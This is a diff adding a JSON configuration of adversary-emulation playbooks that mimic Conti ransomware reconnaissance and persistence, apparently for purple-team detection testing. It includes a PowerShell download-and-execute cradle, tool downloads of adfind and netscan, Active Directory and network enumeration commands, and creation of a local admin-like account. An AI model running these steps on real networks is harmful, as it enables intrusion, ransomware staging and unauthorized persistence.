@@ -1,0 +1,191 @@
+{
+    "type": "local",
+    "sleep": 5,
+    "playbooks": [
+      {
+        "name": "Conti Ransomware Emulation - Local Discovery",
+        "enabled": false,
+        "pbsleep": 0,
+        "tasks": [
+          {
+            "technique_id": "T1033",
+            "technique_name": "System User Discovery - Cmdline"
+          },
+          {
+            "technique_id": "T1016",
+            "technique_name": "System Network Configuration Discovery - Cmdline"
+          },
+          {
+            "technique_id": "T1614.001",
+            "technique_name": "System Location Discovery: System Language Discovery - Cmdline"
+          },
+          {
+            "technique_id": "T1082",
+            "technique_name": "System Information Discovery - Cmdline"
+          },
+          {
+            "technique_id": "T1069.001",
+            "technique_name": "Permission Groups Discovery: Local Groups - Cmdline"
+          },
+          {
+            "technique_id": "T1518.001",
+            "technique_name": "Software Discovery: Security Software Discovery"
+          },
+          {
+            "technique_id": "T1059.003",
+            "command": "net config workstation",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          },
+          {
+            "technique_id": "T1059.003",
+            "command": "query session",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          }
+        ]
+      },
+      {
+        "name": "Conti Ransomware Emulation - Domain User Discovery",
+        "enabled": false,
+        "pbsleep": 0,
+        "tasks": [
+          {
+                "technique_id": "T1087.002",
+                "technique_name": "Account Discovery: Domain Account - Cmdline",
+                "variation": 1
+          },
+          {
+            "technique_id": "T1069.002",
+            "technique_name": "Permission Groups Discovery: Domain Groups - Cmdline",
+            "variation": 1,
+            "groups": [
+                "Domain Admins",
+                "Enterprise Admins"
+            ]
+          },
+          {
+            "technique_id": "T1087.002",
+            "technique_name": "Account Discovery: Domain Account - Cmdline",
+            "variation": 1,
+            "groups": [
+                "domainAdmin",
+                "serverAdmin"
+            ]
+          },
+          {
+            "technique_id": "T1201",
+            "technique_name": "Password Policy Discoveryy - Cmdline"
+          }
+
+        ]
+      },
+      {
+        "name": "Conti Ransomware Emulation - Domain Computer Discovery",
+        "enabled": false,
+        "pbsleep": 0,
+        "tasks": [
+          {
+            "technique_id": "T1059.003",
+            "command": "nltest /dclist:",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          },
+          {
+            "technique_id": "T1018",
+            "technique_name": "Remote System Discovery - Cmdline",
+            "variation": 1
+          },
+          {
+            "technique_id": "T1018",
+            "technique_name": "Remote System Discovery - PowerShell",
+            "variation": 2
+          },
+          {
+            "technique_id": "T1059.001",
+            "technique_name": "Command and Scripting Interpreter: PowerShell - Encoded",
+            "commandlet": "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:36595/'); Get-NetComputer -ping -operatingsystem *server*",
+            "variation": 2
+          },
+          {
+            "technique_id": "T1059.003",
+            "command": "ping 192.168.1.1 && ping 192.168.1.2",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          },
+          {
+            "technique_id": "T1135",
+            "technique_name": "Network Share Discovery",
+            "variation": 2
+          },
+          {
+            "technique_id": "T1083",
+            "technique_name": "File and Directory Discovery - Remote",
+            "variation": 2,
+            "host_target_type": 2,
+            "host_target_total": 5
+          }
+        ]
+      },
+      {
+        "name": "Conti Ransomware Emulation - Download and leverage adfind",
+        "enabled": false,
+        "task_sleep": 3,
+        "tasks": [
+          {
+                "technique_id": "T1105",
+                "technique_name": "Ingress Tool Transfer",
+                "variation": 1,
+                "url": "http://10.0.1.14/adfind.exe"
+          },
+          {
+            "technique_id": "T1059.003",
+            "command": "adfind.exe -f \"(objectcategory=person)\" > ad_users.txt",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          },
+          {
+            "technique_id": "T1059.003",
+            "command": "adfind.exe -f \"(objectcategory=computer)\" > ad_computers.txt",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          },
+          {
+            "technique_id": "T1059.003",
+            "command": "adfind.exe -sc trustdmp > ad_trust.txt",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          },
+          {
+            "technique_id": "T1059.003",
+            "command": "adfind.exe -subnets -f \"(objectCategory=subnet)\" > ad_trust.txt",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          }
+        ]
+      },
+      {
+        "name": "Conti Ransomware Emulation - Download and leverage netscan",
+        "enabled": true,
+        "task_sleep": 3,
+        "tasks": [
+          {
+                "technique_id": "T1105",
+                "technique_name": "Ingress Tool Transfer",
+                "variation": 1,
+                "url": "http://10.0.1.14/netscan.exe"
+          },
+          {
+            "technique_id": "T1059.003",
+            "command": "netscan /hide /auto:\"result.xml\" /range:10.0.0.1-10.0.1.20",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          }
+        ]
+      },
+      {
+        "name": "Conti Ransomware Emulation - Persistence",
+        "enabled": true,
+        "task_sleep": 3,
+        "tasks": [
+          {
+            "technique_id": "T1136.001",
+            "user": "OldAdmin",
+            "technique_name": "Create Account: Local Account - Cmdline",
+            "variation": 1
+          }
+        ]
+      }
+    ]
+  }
